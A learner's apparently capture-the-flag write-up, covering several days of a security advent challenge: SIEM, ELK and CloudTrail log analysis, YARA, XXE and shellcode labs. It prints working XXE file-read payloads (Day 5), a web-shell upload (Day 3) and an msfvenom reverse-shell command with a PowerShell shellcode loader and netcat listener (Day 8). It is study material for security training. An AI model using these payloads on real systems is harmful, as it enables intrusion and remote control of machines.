#Day two

- We begin day two with an explanation on the importance of the SOC, and the ddifference between true and false positives
- We open the siem page and login 
- we set the time to the given date, and are given 21 hits

- To convert this data into readable information, we use various fields which can be added as columns 
- This reveals that one user with the same ip has been pushing the same process under different usernames
- we then scale back the date to 29th November to get more information
- this gives us over 5000 hits, and we need to filter the ip as well as the username
- we now see over 4000 hits, with a lot of authentication failures

- We remove filter out any non authentication processes and anything by the same ip address as before(10.0.11.11)

- We see that there are a lot of authentication attempts by the same ip(10.0.255.1)
- We filter in only the processes and see the following powershell command
    ```C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -EncodedCommand SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA==
    ```
- The encrypted command ends wit '==', indicating that it is in base 64. 
- We run this through cyberchef and get the following output:
    ``` Install-WindowsUpdate -AcceptAll -AutoReboot	 ```

- This command is not malicious, only updates and strengthens the security of the devices

## What I learned:
- Importance of SOC
- difference between tp and fp


#Day 3

Begins with an introduction to ELK and log analysis 

- Opened elastic and navigated to the discover page 
- We set the index pattern to "wareville-rails" and then the date to Oct 1, 2024, this provides 811 hits
- The majority of hits are between 11:30 to 11:35, primarily by the user with ip 10.9.98.230

- we add the filter ``` message:"shell.php" ``` to find anyy messages with the words shell.php, this implies that a shell script is being uploaded to the website

- We change the index pattern to "frostypines-resorts"
- We find the relevant path by searching for "shell.php"
    ``` /media/images/rooms/shell.php ``

- we also get the ip address as 10.11.83.34
- We know login to frostypines, and try logging in as admin
- we need an email id, so I try admin@(various domain names) and eventually admin@frostypines.thm works out
- I examined the website to find a place where I can upload the file
- I find the add room option and upload the file here
- I accessed the file and then executed the command cat flag.txt to receive the final answer

## What I learned
- Web shells
- RCE
- Usage of ELK


# Day 4

- Start by running ``` Get-Help Invoke-Atomictest ``` to get the general information on the command like the syntax 
- We need to understand the 'T1566.001' attack, so we use the command 
    ``` Invoke-AtomicTest T1566.001 -ShowDetails ```
- Through this we get information like the description and the attack commands, as well as the cleanup commands 
- Now we try to emulate the attack by running 
    ``` Invoke-AtomicTest T1566.001 -TestNumbers 1 ```
- Accessing Sysmon through the evenet viewer,we see that there was a process created for powershell to execute: 
    ```
    "powershell.exe" & {$url = 'http://localhost/PhishingAttachment.xlsm' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm}.
    ```
- We find that this is saved in the directory: C:\Users\ADMINI~1\AppData\Local\Temp\
- Navigatin to this directory, we find PhishingAttachment.txt
- This file contains the first flag
- For the answers to the remaining questions, we use ``` Invoke-AtomicTest T1059.003 -ShowDetails ```
- We run test number 4 for this and it gives us a pdf with the flag THM{R2xpdGNoIGlzIG5vdCB0aGUgZW5lbXk=}

# Day 5

-  Begins with an introduction to XML, XXE and how it can be used to procure sensitive information 
- Open the website and add wareville's Jolly cap to wishlist 
- Wish gets saved as Wish 21 which cannot be accessed now 
- Open burpsuite, head to the proxy tab and set intercept on, open browser and access the website again 
- When we click on add to wishlist, a post request is created with the following data:
    ``` <wishlist>
                <user_id>1</user_id>
                <item>
                        <product_id>1</product_id>
                </item>
        </wishlist>
```
- We modify the request to include an external entity like this:
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```
- We now have the information under /etc/hosts
- We now use the following payload to access the information that is visible only to admins:
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
<wishlist>
	<user_id>1</user_id>
	<item>
	       <product_id>&payload;</product_id>
	</item>
</wishlist>
```
- We can now navigate through the wishes by changingn the .txt file
- Send the command to the intruder to run a loop
- At 16, we get the flag THM{Brut3f0rc1n6_mY_w4y}

## What I learned
- XML
- XXE
- Intruder in burpsuite


# Day 6

- Open the Windows registery editor and navigate to current version of Windows  
- Now we learn about YARA, and how it can be used to detect certain malware by searching for particular patterns 
- We run the EDR(End-point Detection and Response), and then the malware
- We get this on the EDR:
```
    YARA Result: SANDBOXDETECTED C:\Users\Administrator\AppData\Local\Temp\2\tmp6450.tmp
Logging to file: C:\Tools\YaraMatches.txt
Event Time: 12/24/2024 07:07:37
Event ID: 1
Event Record ID: 128025
Command Line: C:\Windows\system32\cmd.exe /c reg query "HKLM\Software\Microsoft\Windows\CurrentVersion" /v ProgramFilesDirectory
```
- Now the malwarecan be made stealthier by obsfucation, which essentially encodes the commands that are being run
- Using floss, we now scan through the malware to find relevant strings and store it in the specified file:
    ``` floss.exe C:\Tools\Malware\MerryChristmas.exe |Out-file C:\tools\malstrings.txt ```

- under malstrings.txt, we find the next flag 

## What I learned
- YARA
- Sandboxes
- obsfucation and how this can further be found despite the encoding




# Day 7 

- Brief introduction to AWS, the different services and JQ
- we use this command to filter out all records who match the particular event source(s3.amazonaws.com) and requestParameters.bucketName(wareville-care4wares)
    ``` jq -r '.Records[] | select(.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares")' cloudtrail_log.json ```

- Our result is still incredibly vast so we cut it down further using:
    ```jq -r '.Records[] | select(.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares") | [.eventTime, .eventName, .userIdentity.userName // "N/A",.requestParameters.bucketName // "N/A", .requestParameters.key // "N/A", .sourceIPAddress // "N/A"]' cloudtrail_log.json ```
- We then use the next command to further refine the output and make it more readable:
    ``` jq -r '["Event_Time", "Event_Name", "User_Name", "Bucket_Name", "Key", "Source_IP"],(.Records[] | select(.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares") | [.eventTime, .eventName, .userIdentity.userName // "N/A",.requestParameters.bucketName // "N/A", .requestParameters.key // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t ```

- Here we find the date and time that the qr was switched out 
- WE furthermodify our commands to flow through all the clues that we receive at each step in order to find all the relevant information 

## What I learned

- Log analysis
- jq commands
- some of the services of aws




#Day 8

- Start by running 
    ``` msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.149.16 LPORT=4444 -f powershell ```

-  This produces the hex-encoded shellcode. 
- Now we create a powershell script which can be used to execute the shellcode
- ``` nc -nvlp 1111 ``` this is used to opening a listening port on 1111 and wait for an incoming connection
- We use the following powershell script to execute the shellcode:
```
    $VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread   

[Byte[]] $buf = SHELLCODE_PLACEHOLDER
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```
- Using this script on the vm generates the following response on the attackbox
 ``` Listening on 0.0.0.0 1111
Connection received on 10.10.66.215 49868
Microsoft Windows [Version 10.0.17763.6293]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\glitch>
 ```

- We can now run commands on the vm through the virtualbox
- repeating this process with the port 4444, we get the flag in the desktop

## What I learned
- Usage of shellcoding
